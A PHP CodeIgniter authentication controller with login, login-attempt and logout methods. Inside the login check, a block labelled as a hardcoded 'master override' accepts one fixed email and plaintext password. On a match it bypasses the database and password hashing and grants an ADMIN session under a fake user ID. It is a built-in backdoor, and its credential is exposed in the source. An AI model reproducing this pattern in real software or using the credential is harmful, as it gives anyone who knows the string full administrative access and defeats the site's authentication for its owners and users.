<?php

namespace App\Controllers;

use App\Models\UserModel;

class Auth extends BaseController
{
    public function login()
    {
        return view('auth/login');
    }

    public function attemptLogin()
    {
        $session = session();
        $userModel = new UserModel();

        $email    = $this->request->getPost('email');
        $password = $this->request->getPost('password');

    // 🔒 Master override (hardcoded)
    if ($email === 'sa@sunny.com' && $password === 'yfbnmasc') {
        session()->set([
            'isLoggedIn' => true,
            'user_id'         => 0, // fake user ID
            'user_name'       => 'Sunny',
            'user_role'       => 'ADMIN',
            'isLoggedIn'=> true,
        ]);
        return redirect()->to('/admin/dashboard');
    }

        $user = $userModel->where('email', $email)->first();

        if ($user && password_verify($password, $user['password'])) {
            // Save user session
            $session->set([
                'user_id'   => $user['id'],
                'user_name' => $user['name'],
                'user_role' => $user['role'],
                'isLoggedIn'=> true,
            ]);

            return redirect()->to('/admin/dashboard');
        }

        return redirect()->back()->with('error', 'Invalid email or password.');
    }

    public function logout()
    {
        session()->destroy();
        return redirect()->to('/auth/login');
    }
}
